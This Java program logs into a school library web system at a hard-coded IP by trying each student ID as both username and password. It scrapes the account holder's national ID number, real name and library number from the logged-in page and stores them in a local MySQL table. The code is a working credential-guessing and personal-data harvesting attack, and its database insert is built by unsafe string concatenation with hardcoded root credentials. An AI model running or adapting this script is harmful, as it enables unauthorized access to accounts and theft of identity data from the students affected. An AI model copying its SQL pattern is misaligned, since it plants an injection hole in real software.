import java.io.*;
import java.net.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Lab {
    public static void main(String[] args) throws IOException {

        String url = "http://211.70.171.1/list/dzjs/login.asp";

        String urlnext = "http://211.70.171.1/list/dzjs/login_form.asp";

        String charset = "UTF-8";

        DB db = new DB();

        for(long i = 2015013915; i <= 2015013915; i++) {

            String param = Long.toString(i);

            String query = String.format("user=%s&pw=%s", URLEncoder.encode(param, charset), URLEncoder.encode(param, charset));

            CookieHandler.setDefault(new CookieManager(null, CookiePolicy.ACCEPT_ALL));

            URLConnection connection = new URL(url + "?" + query).openConnection();

            List<String> cookies = connection.getHeaderFields().get("Set-Cookie");

            connection = new URL(urlnext).openConnection();

            BufferedReader bufr = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            String line = null;

            String regex = "\\d{17}\\S";

            String name = "【(\\S+)】";

            String libnum = "\\d{8}";

            Pattern p = Pattern.compile(regex);

            Pattern namep = Pattern.compile(name);

            Pattern libnume = Pattern.compile(libnum);
            String realname = null;
            String libnumeb = null;
            String Id = null;
            while ((line = bufr.readLine()) != null) {
//                System.out.println(line);
                Matcher m = p.matcher(line);
                if (m.find()) {
                    System.out.println("身份证" + m.group());
                    Id = m.group();
                }
                Matcher n = namep.matcher(line);
                if (n.find()) {
                    System.out.print("学号 " + i + "\t" + "姓名" + n.group(1) +"\t");
                    realname = n.group(1);
                }
                Matcher j = libnume.matcher(line);
                if(j.find())
                    libnumeb = j.group();


            }
            db.insert(i,realname,libnumeb,Id);
        }
    }

}

class DB {

    static final String DB_URL = "jdbc:mysql://localhost:3306/Lib?useUnicode=true&characterEncoding=UTF-8";

    //set database username password
    static final String USER = "root";
    static final String PASS = "123456";

    Connection conn = null;
    Statement stmt = null;

    //insert data
    public  void insert(long data1, String data2, String data3, String data4) {

        try{
            //Register JDBC driver, maybe userful
            //Class.forName("com.mysql.jdbc.Driver");

            //Open a connection
            conn = DriverManager.getConnection(DB_URL, USER, PASS);

            //Execute a query
            stmt = conn.createStatement();

            String sql = "INSERT INTO lib " +
                    "VALUES (" + "134"+",'"+ data2+"'," + data3 +",'"+data4+"')";

            //ensure sql
//            System.out.println(sql);

            stmt.executeUpdate(sql);
        }
        catch(Exception e){
            //Handle errors for Class.forName
            e.printStackTrace();
        }
    }
}



